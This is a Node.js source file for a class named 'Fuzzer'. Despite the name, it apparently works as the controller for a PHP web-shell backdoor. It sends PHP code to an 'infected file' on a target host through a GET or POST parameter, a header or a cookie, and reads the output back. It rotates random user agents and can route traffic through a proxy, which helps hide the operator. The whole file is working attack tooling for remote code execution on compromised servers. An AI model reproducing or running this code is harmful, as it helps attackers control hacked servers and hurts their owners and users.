const ApiCaller = require('request');
const UserAgent = require('random-useragent');

/*
 * @author LeakLessGfy
 * Class to call infected file
 *
 * @param {object} config - Fuzzer's configuration
 * @config {string} Host - target URL
 * @config {int} Method - Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
 * @config {string} Parameter - Infected parameters
 * @config {int} Crypt - Crypt method
 * @config {string} Proxy - Proxy url
 */
class Fuzzer {
	constructor(config) {
		this._host = config.host;
		this._method = parseInt(config.method);
		this._parameter = config.parameter || "Dec";
		this._crypt = config.crypt || null;
		this._httpMethod = this._getHttpMethod();

		this._config = {
			url: this._host,
			method: this._httpMethod,
			headers: {},
			form: {},
			jar: null,
			proxy: config.proxy || null
		};
	}

	/**
	 * [Private] Get php string to get response
	 * @return {string} response
	 */
	_getHandleback() {
		let response;

		switch(this._method) {
			case 0:
			case 1:
				response = "echo($r);exit();";
				break;
			case 2: 
				response = "header('" + this._parameter + ":' . $r);exit();";
				break;
			case 3:
				response = "setcookie('" + this._parameter + "', $r);exit();";
				break;
		}

		return response;
	}

	/**
	 * [Private] Get the right HTTP method
	 * @return {string}
	 */
	_getHttpMethod() {
		if(this._method == 1) {
			return "POST"
		}

		return "GET";
	}

	/**
	 * [Private] Get request's config
	 * @return {object} config
	 */
	_getConfig(r) {
		let config = null;

		if(typeof r === 'object') {
			config = r;
		} else if(typeof r === 'string') {
			config = this.prepare(r);
		}

		return config;
	}

	/**
	 * [Private] Get the raw buffer
	 * @return {object} buffer
	 */
	_getBuffer(response, body, cookies, ref) {
		let buffer = null;

		switch(ref._method) {
			case 0:
			case 1: //GET && POST
				buffer = body;//JSON.parse(response.body);
				break;
			case 2: //Header
				buffer = response.headers[ref._parameter.toLowerCase()];
				break;
			case 3: //Cookie
				let lgt = cookies.length;

				for(var i = 0; i < lgt; i++) {
					if(cookies[i].key === ref._parameter) {
						buffer = cookies[i].value;
						i = cookies.length + 1;
					}
				}
				//JSON.parse(decodeURIComponent(raw));
				break;
		}

		logger.log("info", "INFO - Buffer: \n" + buffer);

		return buffer;
	}

	/**
	 * Prepare request's configuration
	 *
	 * @param {string} request - Raw request in string, usually in PHP
	 * @return {object} config
	 */
	prepare(request) {
		let config = this._config;

		config.headers["User-Agent"] = UserAgent.getRandom();
		request = request + this._getHandleback();

		switch(this._method) {
			case 0: //GET
				config.url = this._host + "?" + this._parameter + "=" + encodeURIComponent(request);
				break;
			case 1: //POST
				config.form[this._parameter] = request;
				break;
			case 2: //Header
				config.headers[this._parameter] = request;
				break;
			case 3: //Cookie
				let j = ApiCaller.jar(); 
				let cookie = ApiCaller.cookie(this._parameter + '=' + encodeURIComponent(request));
				j.setCookie(cookie, this._host);
			
				config.jar = j;
				break;
		}

		return config;
	}

	/**
	 * Send request
	 * 
	 * @param {object || string} request - An already formated request or a string that represent the request
	 * @param {function} bufferCallback - A special buffer handler, most of the case you don't need it
	 * @return {object}
	 */
	send(request, bufferCallback) {
		var self = this;

		this._config = this._getConfig(request);
		if(this._config === null) {
			logger.error("ERROR - Request is not valid!");
			throw new Error("Request is not valid!");
		}

		logger.log("info", "FINISH - Building config: \n %j \n", this._config, {});

		if(typeof bufferCallback != "function") {
			bufferCallback = this._getBuffer;
		}

		return new Promise(function(resolve, reject) {
			ApiCaller(self._config, function(error, response, body) {
				if(!error && response.statusCode == 200) {
					logger.log("info", "INFO - Response: \n %s \n ", response);
					logger.log("info", "INFO - Body: \n %s \n ", body);

					let cookies = null;
					if(self._config.jar != null) {
						cookies = self._config.jar.getCookies(self._host);
						logger.log("info", "INFO - Cookies: \n %s \n ", cookies);
					}

					let buffer = bufferCallback(response, body, cookies, self);
					resolve(buffer);
				}

				logger.log("error", "ERROR - Error: \n %j \n", error, {});
				reject(error);
			});
		});
	}
}

module.exports = Fuzzer;
